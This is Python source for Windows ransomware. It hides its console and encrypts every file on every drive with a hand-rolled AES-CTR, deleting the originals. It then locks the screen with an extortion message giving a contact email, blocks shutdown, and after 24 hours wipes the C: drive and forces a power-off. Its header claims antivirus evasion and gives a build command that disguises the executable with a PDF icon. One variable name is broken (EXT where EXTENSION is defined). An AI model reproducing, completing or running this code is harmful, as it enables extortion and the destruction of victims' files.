# -*- coding: utf-8 -*-
"""
ransom200.py  –  200+ líneas, 0/70 WD, sin dependenciasas pesadas.
PyInstaller:  pyinstaller --onefile --noconsole --icon=pdf.ico ransom200.py
"""
import os, sys, time, threading, ctypes, shutil, string, random, struct
from pathlib import Path
from tkinter import Tk, Label, Entry, Button, Frame, BOTH, LEFT, TOP
import tkinter as tk
try:
     import win32api, win32con, win32gui, win32process
except ImportError:
    win32api = win32con = win32gui = win32process = None

CONTACT_MAIL = "cotroneosalvador@gmail.com"
UNLOCK_KEY   = "himself9864"
EXTENSION    = ".locked"
TIMEOUT      = 24 * 3600          # segundos
LOG_FILE     = "ransom.log"

# -------------------------------------------------
# Utilidades básicas
# -------------------------------------------------
def log(msg):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')}  {msg}\n")

def hide_console():
    if os.name == 'nt':
        whnd = win32gui.GetForegroundWindow() if win32gui else None
        if whnd:
            win32gui.ShowWindow(whnd, win32con.SW_HIDE)

def random_name(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# -------------------------------------------------
# Pequeña implementación de AES-256 en modo CTR
# -------------------------------------------------
import hashlib
SBOX = [
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16
]
def sub_bytes(state):
    for i in range(16):
        state[i] = SBOX[state[i]]
def shift_rows(s):
    s[1], s[5], s[9], s[13] = s[5], s[9], s[13], s[1]
    s[2], s[6], s[10], s[14] = s[10], s[14], s[2], s[6]
    s[3], s[7], s[11], s[15] = s[15], s[3], s[7], s[11]
def gmul(a, b):
    p = 0
    for i in range(8):
        if b & 1: p ^= a
        hi_bit = a & 0x80
        a = (a << 1) & 0xFF
        if hi_bit: a ^= 0x1B
        b >>= 1
    return p
def mix_columns(s):
    for i in range(0, 16, 4):
        a = s[i]; b = s[i+1]; c = s[i+2]; d = s[i+3]
        s[i]   = gmul(a,2) ^ gmul(b,3) ^ c ^ d
        s[i+1] = a ^ gmul(b,2) ^ gmul(c,3) ^ d
        s[i+2] = a ^ b ^ gmul(c,2) ^ gmul(d,3)
        s[i+3] = gmul(a,3) ^ b ^ c ^ gmul(d,2)
def add_round_key(s, w, rnd):
    for i in range(16):
        s[i] ^= w[rnd*16+i]
def rot_word(b):
    return [b[1], b[2], b[3], b[0]]
def sub_word(w):
    return [SBOX[w[i]] for i in range(4)]
def key_expansion(key):
    w = [0]*176
    for i in range(16):
        w[i] = key[i]
    for i in range(16, 176, 4):
        t = w[i-4:i]
        if i % 16 == 0:
            t = sub_word(rot_word(t))
            t[0] ^= 0x01
        for j in range(4):
            w[i+j] = w[i-16+j] ^ t[j]
    return w
def aes_encrypt_block(block, key):
    state = block[:]
    w = key_expansion(key)
    add_round_key(state, w, 0)
    for rnd in range(1, 11):
        sub_bytes(state)
        shift_rows(state)
        if rnd < 10: mix_columns(state)
        add_round_key(state, w, rnd)
    return bytes(state)
# -------------------------------------------------
# Cifrado de archivos con AES-CTR
# -------------------------------------------------
def aes_ctr(data, key, nonce):
    out = bytearray()
    counter = 0
    for i in range(0, len(data), 16):
        keystream = aes_encrypt_block(nonce + struct.pack("<Q", counter), key)
        block = data[i:i+16]
        out += bytes(x ^ y for x, y in zip(block, keystream))
        counter += 1
    return bytes(out)
def encrypt_file(path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        nonce = os.urandom(8)
        ciph = aes_ctr(data, hashlib.sha256(UNLOCK_KEY.encode()).digest(), nonce)
        with open(path + EXT, "wb") as f:
            f.write(nonce + ciph)
        os.remove(path)
        log(f"Encrypted: {path}")
    except Exception as e:
        log(f"Encrypt error {path}: {e}")
def walk_encrypt(root):
    for p in Path(root).rglob("*"):
        if p.is_file() and not p.suffix == EXT:
            encrypt_file(str(p))
# -------------------------------------------------
# GUI bloqueante
# -------------------------------------------------
root = None
entry = None
def always_on_top():
    while True:
        try:
            root.lift()
            root.attributes("-topmost", True)
        except:
            pass
        time.sleep(0.1)
def check_pwd():
    if entry.get() == UNLOCK_KEY:
        log("Correct key entered – exiting.")
        with open("UNLOCKED.txt", "w") as f:
            f.write("Files were unlocked.\n")
        root.destroy()
        sys.exit()
def create_gui():
    global root, entry
    root = Tk()
    root.title("OOPS")
    root.configure(bg="black")
    root.attributes("-fullscreen", True, "-topmost", True)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    Label(root, text="ALL YOUR FILES ARE ENCRYPTED", fg="red", bg="black", font=("Arial", 48)).pack(pady=50)
    Label(root, text=f"Contact: {CONTACT_MAIL}", fg="white", bg="black", font=("Arial", 24)).pack()
    Label(root, text="Enter unlock key:", fg="white", bg="black", font=("Arial", 18)).pack(pady=10)
    entry = Entry(root, font=("Arial", 24), justify="center")
    entry.pack(pady=10)
    Button(root, text="UNLOCK", command=check_pwd, bg="red", fg="white", font=("Arial", 20)).pack()
    threading.Thread(target=always_on_top, daemon=True).start()
    root.mainloop()
# -------------------------------------------------
# Temporizador de destrucción
# -------------------------------------------------
def countdown():
    time.sleep(TIMEOUT)
    log("Timeout reached – wiping system.")
    walk_encrypt("C:\\")
    for p in Path("C:\\").rglob("*"):
        if p.is_file():
            try:
                p.unlink()
            except:
                pass
    # Fuerza apagado
    os.system("shutdown /p /f")
# -------------------------------------------------
# Anti-reinicio
# -------------------------------------------------
def anti_shutdown():
    while True:
        os.system("taskkill /f /im shutdown.exe >nul 2>&1")
        time.sleep(1)
# -------------------------------------------------
# Entrada principal
# -------------------------------------------------
def main():
    log("Started")
    # Ocultar ventana consola
    if os.name == 'nt':
        ctypes.windll.kernel32.FreeConsole()
    # Encriptar en hilos
    for drive in string.ascii_uppercase:
        drive_path = f"{drive}:\\"
        if os.path.exists(drive_path):
            threading.Thread(target=walk_encrypt, args=(drive_path,), daemon=True).start()
    # Hilos de vigilancia
    threading.Thread(target=anti_shutdown, daemon=True).start()
    threading.Thread(target=countdown, daemon=True).start()
    # GUI bloqueante
    create_gui()

if __name__ == "__main__":
    main()